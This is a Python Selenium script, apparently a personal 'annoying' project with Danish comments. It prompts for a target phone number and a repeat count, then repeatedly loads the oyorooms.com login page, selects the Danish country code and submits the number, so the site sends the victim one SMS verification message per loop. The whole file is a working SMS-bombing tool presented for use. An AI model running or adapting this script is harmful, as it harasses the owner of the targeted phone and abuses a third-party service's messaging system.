from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import time

options = Options()


# ----- /// SETTINGS START /// --------------------------------------------------------------------------------------------------------------
#Headless:
options.headless = False

#Log til terminal:
silent = False

#Delay mellem aktioner, anbefalet 1
x = 1

Concode = "+45"
# ----- /// SETTINGS END /// ----------------------------------------------------------------------------------------------------------------

driver = webdriver.Chrome(options=options, executable_path=r'/Users/Benjamin/Documents/Projects/anoyingPython/chromedriver')

Targetnumber = input("Enter a phone number: ")
print("will target: ", Concode, Targetnumber)

amount = input("Enter amount of hits (this can take time): ")
amount = int(amount)
print("Will run: ", amount, " times")
count = 0
while count < amount:
    driver.get("https://www.oyorooms.com/login?country=&retUrl=/")
    if silent != True:
        print ("Headless Chrome Initialized")

    if silent != True:
        print("Sleeping for ", x, "seconds...")

    time.sleep(x)

    if silent != True:
        print ("Ready to look for button")

    phonedDropdown = driver.find_element_by_xpath('//*[@id="root"]/div/div[3]/div[1]/div/div/div/div/div[2]/div[2]/div[2]/div[1]/div/div[3]/span')
    if silent != True:
        print("Element Found")
    actions = ActionChains(driver)
    actions.click(phonedDropdown).perform()
    if silent != True:
        print ("Button pressed")
        print ("Looking for DK")

    countryCodeDK = driver.find_element_by_xpath('//*[@id="root"]/div/div[3]/div[1]/div/div/div/div/div[2]/div[2]/div[2]/div[1]/div/div[3]/span/ul/li[69]')
    if silent != True:
        print ("Found DK")
    actions.click(countryCodeDK).perform()

    if silent != True:
        print ("Clicked DK")
        print("Sleeping for ", x, "seconds...")

    time.sleep(x)
    if silent != True:
        print("Looking for a place to input a phone number")

    placeForPhoneNumber = driver.find_element_by_xpath('/html/body/div/div/div[3]/div[1]/div/div/div/div/div[2]/div[2]/div[2]/div[1]/div/div[3]/input')
    if silent != True:
        print("Sleeping for ", x, "seconds...")

    time.sleep(x)
    placeForPhoneNumber.send_keys(Targetnumber)

    if silent != True:
        print("Number entered...")
        print("Sleeping for ", x, "seconds...")


    time.sleep(x)

    if silent != True:
        print("Sending..")
    # SendButton = driver.find_element_by_xpath('/html/body/div[2]/div/div[3]/div[1]/div/div/div/div/div[2]/div[2]/div[2]/div[1]/div/button')
    # actions.click(SendButton).perform()
    placeForPhoneNumber.send_keys(Keys.RETURN)
    if silent != True:
        print("SMS Sent")
    driver.get("https://www.oyorooms.com/login?country=&retUrl=/")
    count = count + 1
    print("Done with ", count, "of ", amount)

print("Done!")
driver.quit()